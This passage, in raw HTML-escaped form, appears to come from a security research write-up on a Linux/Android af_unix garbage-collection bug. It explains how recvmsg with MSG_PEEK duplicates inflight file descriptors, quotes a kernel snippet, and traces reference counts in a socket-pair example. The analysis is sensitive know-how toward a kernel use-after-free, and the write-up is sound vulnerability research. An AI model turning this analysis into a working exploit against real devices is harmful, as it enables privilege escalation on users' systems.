class=\"ykcrMYlEiJ-c3\"&gt;scm_detach_fds&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;is invoked for installing a new file descriptor.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.yfq48nayx2kg\"&gt;&lt;span&gt;r&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c1\"&gt;ecvmsg with MSG_PEEK flag&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;process is different i&lt;/span&gt;&lt;span&gt;f the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag is set. The &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag is used during receive to &amp;ldquo;peek&amp;rdquo; at the message, but the data is treated as unread. &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_stream_read_generic&lt;/span&gt;&lt;span&gt;&amp;nbsp;will invoke &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_fp_dup&lt;/span&gt;&lt;span&gt;&amp;nbsp;instead of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_detach_fds&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;This increases the reference count of the inflight file (&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://android.googlesource.com/kernel/goldfish/+/eee65a1282369eedfcbb664d0c865a0ef3eb7017/net/unix/af_unix.c#2149\"&gt;af_unix.c#2149&lt;/a&gt;&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.54ddd657e781757bb7c1f32330ad770b045c0ed3\"&gt;&lt;/a&gt;&lt;a id=\"t.16\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* It is questionable, see note in unix_dgram_recvmsg.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14 ykcrMYlEiJ-c7\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;).&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;.&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;scm_fp_dup&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;).&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk_peek_offset_fwd&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;chunk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;).&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;break&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Because the data should be treated as unread, the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not unlinked and consumed when the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;flag is set. However, the receiver will still get a new file descriptor for the inflight socket.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.4kuedi8b9x2y\"&gt;&lt;span&gt;recvmsg &lt;/span&gt;&lt;span&gt;Examples&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Let&amp;rsquo;s see a concrete example. Assume there are the following socket pairs:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c27 lst-kix_k47gmg94hbw2-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Now, the program does the following operations:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c27 lst-kix_8chkxhfzc2ds-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;rarr; [&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;] &amp;rarr; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1 &lt;/span&gt;&lt;span&gt;(means &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;sends [&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;] to &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;rarr; [&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;] &amp;rarr; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"c11 c19 c37\"&gt;1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;Close&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhi5B8kJXBAiYH3vq8NcQtmatM_hz8o9KgBZpMbMyd9QwRC84jh-SZo76fLhvSFrRohs4pUhBW48q3fQ0bUu0DlySHyJhDMC69rz8qwEM8nHK4b1RGLMw9QGwPmf4E7iMjo5Noa6eF-GDEuMqa4Gzq0fwiBCXU_x0i_Q7eGd2OqiIbu7lYFFaErVE5o/s1102/image62.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhi5B8kJXBAiYH3vq8NcQtmatM_hz8o9KgBZpMbMyd9QwRC84jh-SZo76fLhvSFrRohs4pUhBW48q3fQ0bUu0DlySHyJhDMC69rz8qwEM8nHK4b1RGLMw9QGwPmf4E7iMjo5Noa6eF-GDEuMqa4Gzq0fwiBCXU_x0i_Q7eGd2OqiIbu7lYFFaErVE5o/s1102/image62.png\" border=\"0\" alt=\"f00, f01, f10, f11 forms a breakable cycle.\" style=\"max-height: 750px; max-width: 600px;\"title=\"f00, f01, f10, f11 forms a breakable cycle.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;Breakable cycle by &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;and&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Here is the status:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c27 lst-kix_9gryrzygx46m-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 2, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;) = 2&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;If the garbage collection process happens now, before any &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls, the kernel will choose &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;as the garbage candidate. However, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;will not have the inflight count altered and the kernel will not purge any garbage.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;I&lt;/span&gt;&lt;span&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;then calls &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c39\"&gt;with&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag, t&lt;/span&gt;&lt;span&gt;he receive queue doesn&amp;rsquo;t change and the inflight counts are not decremented. &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;gets a new file descriptor &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;&amp;#39;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which increments the &lt;/span&gt;&lt;span&gt;reference count on &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhO9D3ODJFXZt6dQmkyP1e7zZe0smN042wAbdy7isVbd407L-oCrSDS9LDCBshKwft2pWiuKHXQBclib4tQFoou-8U14ZNuyeJMRxDjtuFsTk3B_TDHVQNDl5x8aLt09negBlNpoEzrYgybadh-KbAAGu_U4hqaDNLyOpWFbI06Vjfh1kam2JHuD7yH/s1216/image63.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhO9D3ODJFXZt6dQmkyP1e7zZe0smN042wAbdy7isVbd407L-oCrSDS9LDCBshKwft2pWiuKHXQBclib4tQFoou-8U14ZNuyeJMRxDjtuFsTk3B_TDHVQNDl5x8aLt09negBlNpoEzrYgybadh-KbAAGu_U4hqaDNLyOpWFbI06Vjfh1kam2JHuD7yH/s1216/image63.png\" border=\"0\" alt=\"After f01 receives the socket file descriptor by MSG_PEEK, the reference count of f00 is incremented and the receive queue from f01 remains the same.\" style=\"max-height: 750px; max-width: 600px;\"title=\"After f01 receives the socket file descriptor by MSG_PEEK, the reference count of f00 is incremented and the receive queue from f01 remains the same.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c3 ykcrMYlEiJ-c38\"&gt;MSG_PEEK&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;&amp;nbsp;increment the reference count of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"c34 c19 c32\"&gt;&amp;nbsp;while the receive queue is not cleared&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Status:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c27 lst-kix_9gryrzygx46m-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 2, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;) = 3&lt;/span&gt;&lt;/li&gt;&lt;li 